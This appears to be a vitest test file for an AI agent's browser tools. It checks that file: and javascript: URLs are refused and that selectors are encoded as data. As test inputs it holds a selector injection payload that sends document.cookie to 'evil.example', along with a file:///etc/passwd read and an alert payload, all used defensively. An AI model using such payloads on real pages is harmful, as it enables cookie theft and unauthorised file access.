/**
 * The agent's browser tools, and the three ways they are allowed to say no.
 *
 * These handlers are the one place a model's output reaches a live page, so the
 * cases worth pinning are the boundaries rather than the happy paths:
 *
 *  - **The scheme gate holds for the agent too.** `browserUrlFor` is the rule,
 *    and a tool call is not a privileged way around it — an agent asking for
 *    `file:///etc/passwd` gets the same refusal a person typing it would.
 *  - **A selector is data, never code.** Selectors are model output and
 *    routinely contain quotes; they reach the page through `JSON.stringify`, so
 *    a selector that tries to close the string and keep going is inert.
 *  - **A failure is an answer, not an exception.** MCP distinguishes "the tool
 *    threw" from "the tool ran and the result is no", and almost everything
 *    here is the second — a stack trace tells the agent nothing it can act on.
 *
 * No Electron: the handlers take a {@link BrowserToolContext}, and a fake one
 * records what a real page would have been asked to do. What is under test is
 * the decisions, not Chromium.
 */

import { describe, expect, it, vi } from 'vitest';

import type { BrowserId, BrowserState, RunId } from '@rx-artemis/protocol';

import {
  agentBrowserServers,
  browserTools,
  externalBrowserTools,
  type BrowserToolContext,
} from './browserTools';

const RUN = 'run-1' as RunId;
const ID = 'browser-1' as BrowserId;

function stateWith(over: Partial<BrowserState> = {}): BrowserState {
  return {
    url: 'https://example.com',
    title: 'Example',
    loading: false,
    canGoBack: false,
    canGoForward: false,
    ...over,
  };
}

/** A context that records what a page would have been asked, and answers. */
function fakeContext(over: Partial<BrowserToolContext> = {}): {
  context: BrowserToolContext;
  scripts: string[];
  opened: (string | undefined)[];
  navigated: string[];
} {
  const scripts: string[] = [];
  const opened: (string | undefined)[] = [];
  const navigated: string[] = [];

  const context: BrowserToolContext = {
    ensure: async (_run, url) => {
      opened.push(url);
      return ID;
    },
    current: () => ID,
    host: {
      contentsFor: () =>
        ({
          isLoading: () => false,
          executeJavaScript: async (script: string) => {
            scripts.push(script);
            return 'the page text';
          },
          once: () => undefined,
          off: () => undefined,
          capturePage: async () => ({ isEmpty: () => true, toPNG: () => Buffer.alloc(0) }),
        }) as never,
      stateFor: () => stateWith(),
      navigate: (_id, url) => {
        navigated.push(url);
        return url;
      },
    },
    ...over,
  };

  return { context, scripts, opened, navigated };
}

/**
 * One tool's handler, by name.
 *
 * Straight off {@link browserTools} rather than out of the built server:
 * `createSdkMcpServer` consumes the definitions into an `McpServer` whose
 * handlers are only reachable through a transport, and standing one of those up
 * would test the SDK rather than these decisions.
 */
function handlerFor(context: BrowserToolContext, name: string): (args: never) => Promise<unknown> {
  const found = browserTools(RUN, context).find((one) => one.name === name);
  if (found === undefined) throw new Error(`No tool named ${name}`);
  return found.handler as (args: never) => Promise<unknown>;
}

describe('the scheme gate applies to the agent', () => {
  it('refuses a file: URL from browser_open, as it would from the address bar', async () => {
    const { context, opened } = fakeContext();
    const open = handlerFor(context, 'browser_open');

    const result = (await open({ url: 'file:///etc/passwd' } as never)) as { isError?: true };

    expect(result.isError).toBe(true);
    // And crucially: nothing was opened. A refusal that still created the view
    // would be a refusal in name only.
    expect(opened).toEqual([]);
  });

  it('refuses javascript: rather than running it', async () => {
    const { context, opened } = fakeContext();
    const open = handlerFor(context, 'browser_open');

    const result = (await open({ url: 'javascript:alert(1)' } as never)) as { isError?: true };
    expect(result.isError).toBe(true);
    expect(opened).toEqual([]);
  });

  it('opens an ordinary https address', async () => {
    const { context, opened } = fakeContext();
    const open = handlerFor(context, 'browser_open');

    const result = (await open({ url: 'https://example.com' } as never)) as { isError?: true };
    expect(result.isError).toBeUndefined();
    expect(opened).toEqual(['https://example.com']);
  });
});

describe('selectors are data', () => {
  it('sends a selector containing quotes through as a literal', async () => {
    const { context, scripts } = fakeContext();
    const click = handlerFor(context, 'browser_click');

    await click({ selector: 'button[data-id="save"]' } as never);

    // The selector appears exactly once, JSON-encoded — not spliced into the
    // script as bare source, where its quotes would end the string early.
    expect(scripts[0]).toContain(JSON.stringify('button[data-id="save"]'));
  });

  it('neutralises a selector that tries to close the string and keep going', async () => {
    const { context, scripts } = fakeContext();
    const click = handlerFor(context, 'browser_click');

    const hostile = `x"); fetch("https://evil.example/?c="+document.cookie); ("`;
    await click({ selector: hostile } as never);

    const script = scripts[0] ?? '';
    // The payload is inside a string literal rather than beside one: the
    // encoded form is present and the raw form is not.
    expect(script).toContain(JSON.stringify(hostile));
    expect(script).not.toContain('fetch("https://evil.example');
  });

  it('encodes typed text as well as the selector', async () => {
    const { context, scripts } = fakeContext();
    const type = handlerFor(context, 'browser_type');

    await type({ selector: '#q', text: '"); alert(1); ("' } as never);

    expect(scripts[0]).toContain(JSON.stringify('"); alert(1); ("'));
    expect(scripts[0]).not.toContain('alert(1); ("');
  });
});

describe('failures are answers', () => {
  it('reports “no browser open” rather than throwing', async () => {
    const { context } = fakeContext({ current: () => null });
    const read = handlerFor(context, 'browser_read');

    const result = (await read({} as never)) as { isError?: true; content: { text: string }[] };

    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toContain('browser_open');
  });

  it('reports a selector that matched nothing, naming it', async () => {
    const { context } = fakeContext();
    // A page where `querySelector` finds nothing returns false from the script.
    vi.spyOn(context.host, 'contentsFor').mockReturnValue({
      isLoading: () => false,
      executeJavaScript: async () => false,
      once: () => undefined,
      off: () => undefined,
    } as never);

    const click = handlerFor(context, 'browser_click');
    const result = (await click({ selector: '#missing' } as never)) as {
      isError?: true;
      content: { text: string }[];
    };

    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toContain('#missing');
  });

  it('reports a hidden tab as a reason rather than returning a blank image', async () => {
    // `capturePage` on a detached view yields an empty image. Handing that to
    // the model as a screenshot would have it describe a blank rectangle.
    const { context } = fakeContext();
    const shot = handlerFor(context, 'browser_screenshot');

    const result = (await shot({} as never)) as { isError?: true; content: { text: string }[] };

    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toContain('hidden');
  });
});

describe('reading a page', () => {
  it('asks for the text a reader would see, not the markup', async () => {
    const { context, scripts } = fakeContext();
    const read = handlerFor(context, 'browser_read');

    await read({} as never);

    // `innerText` honours `display: none` and skips attributes; `innerHTML`
    // would be mostly framework noise and many times the size.
    expect(scripts[0]).toContain('innerText');
    expect(scripts[0]).not.toContain('innerHTML');
  });

  it('captions the text with where it came from', async () => {
    const { context } = fakeContext();
    const read = handlerFor(context, 'browser_read');

    const result = (await read({} as never)) as { content: { text: string }[] };
    expect(result.content[0]?.text).toContain('https://example.com');
    expect(result.content[0]?.text).toContain('the page text');
  });
});

/* -------------------------------------------------------------------------- */
/* Which browser a run gets                                                   */
/* -------------------------------------------------------------------------- */

describe('which browser a run gets', () => {
  /** Builders that record being asked and return tell-apart markers. */
  function builders(): {
    asked: string[];
    build: { embedded: () => never; external: () => never };
  } {
    const asked: string[] = [];
    return {
      asked,
      build: {
        embedded: () => {
          asked.push('embedded');
          return 'the embedded server' as never;
        },
        external: () => {
          asked.push('external');
          return 'the external server' as never;
        },
      },
    };
  }

  it('hands a run with no preference the embedded browser, under the contracted name', () => {
    const { asked, build } = builders();

    const servers = agentBrowserServers({}, build);

    // The key is the contract: permission rules and skills address
    // `mcp__artemisBrowser__…`, whatever the mode.
    expect(servers).toEqual({ artemisBrowser: 'the embedded server' });
    expect(asked).toEqual(['embedded']);
  });

  it('hands a run that prefers the user’s browser the open-only server', () => {
    const { asked, build } = builders();

    const servers = agentBrowserServers({ externalBrowser: true }, build);

    expect(servers).toEqual({ artemisBrowser: 'the external server' });
    expect(asked).toEqual(['external']);
  });

  it('hands a Chrome-bridge run nothing at all, and builds nothing', () => {
    const { asked, build } = builders();

    const servers = agentBrowserServers({ chromeBrowser: true }, build);

    // The CLI brings its own tool set; a sibling `browser_open` from the host
    // would be a second tool with one name's worth of purpose.
    expect(servers).toBeUndefined();
    // Laziness is part of the contract: a run that gets the bridge must not
    // stand up the embedded server it will never use.
    expect(asked).toEqual([]);
  });

  it('lets Chrome win when both preferences are set', () => {
    const { asked, build } = builders();

    const servers = agentBrowserServers({ chromeBrowser: true, externalBrowser: true }, build);

    expect(servers).toBeUndefined();
    expect(asked).toEqual([]);
  });
});

/* -------------------------------------------------------------------------- */
/* The external open tool                                                     */
/* -------------------------------------------------------------------------- */

describe('the external open tool', () => {
  function externalHandler(openExternal: (url: string) => void | Promise<void>): {
    open: (args: never) => Promise<unknown>;
    tools: readonly { name: string }[];
  } {
    const tools = externalBrowserTools(openExternal);
    const found = tools.find((one) => one.name === 'browser_open');
    if (found === undefined) throw new Error('No external browser_open');
    return { open: found.handler as (args: never) => Promise<unknown>, tools };
  }

  it('offers exactly one tool, named as the embedded browser_open is', () => {
    // Same name so a permission allow-list built under one mode survives the
    // other; nothing else, because read/screenshot/click/type only make sense
    // against a page this process owns, and registering them just to refuse
    // would teach the model tools it must not use.
    const { tools } = externalHandler(() => undefined);
    expect(tools.map((one) => one.name)).toEqual(['browser_open']);
  });

  it('refuses a file: URL without touching the user’s browser', async () => {
    // More riding on this gate than on the embedded one: the URL leaves the
    // sandbox for the user's real browser, so file: stops here, not there.
    const opened: string[] = [];
    const { open } = externalHandler((url) => void opened.push(url));

    const result = (await open({ url: 'file:///etc/passwd' } as never)) as { isError?: true };

    expect(result.isError).toBe(true);
    expect(opened).toEqual([]);
  });

  it('refuses javascript: rather than handing it to the shell', async () => {
    const opened: string[] = [];
    const { open } = externalHandler((url) => void opened.push(url));

    const result = (await open({ url: 'javascript:alert(1)' } as never)) as { isError?: true };

    expect(result.isError).toBe(true);
    expect(opened).toEqual([]);
  });

  it('opens an ordinary https address in the user’s browser', async () => {
    const opened: string[] = [];
    const { open } = externalHandler((url) => void opened.push(url));

    const result = (await open({ url: 'https://example.com' } as never)) as {
      isError?: true;
      content: { text: string }[];
    };

    expect(result.isError).toBeUndefined();
    expect(opened).toEqual(['https://example.com']);
    // The model is told, in the reply, that it cannot see what it opened —
    // the description says so too, but the reply is what survives context.
    expect(result.content[0]?.text).toContain('cannot see');
  });

  it('reports a failed open as an answer, not an exception', async () => {
    const { open } = externalHandler(() => {
      throw new Error('the shell refused');
    });

    const result = (await open({ url: 'https://example.com' } as never)) as {
      isError?: true;
      content: { text: string }[];
    };

    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toContain('the shell refused');
  });
});
